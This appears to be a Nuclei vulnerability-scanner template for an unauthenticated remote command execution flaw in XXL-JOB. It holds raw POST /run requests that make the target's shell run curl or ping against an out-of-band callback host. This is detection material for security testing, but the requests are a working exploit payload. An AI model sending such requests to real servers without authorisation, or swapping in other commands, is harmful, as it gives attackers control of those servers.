id: xxl-job-rce
info:
  name: XXL-JOB Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    XXL-JOB is a distributed task scheduling platform. By default, its API interface lacks authentication measures. Unauthorized attackers can construct malicious requests to execute remote commands and directly control the server.
  reference:
    - http://www.xuxueli.com/

variables:
  timestamp: '{{unix_time()}}'
  randomString: '{{rand_base(4)}}'

http:
  - raw:
      - |
        POST /run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"jobId":1, "executorHandler":"demoJobHandler","executorParams":"demoJobHandler","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":{{timestamp}},"glueType":"GLUE_SHELL","glueSource":"curl http://{{interactsh-url}}","glueUpdatetime":{{timestamp}},"broadcastIndex":0,"broadcastTotal":0}

  - raw:
      - |
        POST /run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"jobId":1, "executorHandler":"demoJobHandler","executorParams":"demoJobHandler","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":{{timestamp}},"glueType":"GLUE_SHELL","glueSource":"ping http://{{interactsh-url}}","glueUpdatetime":{{timestamp}},"broadcastIndex":0,"broadcastTotal":0}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
      - type: word
        part: interactsh_protocol
        words:
          - http
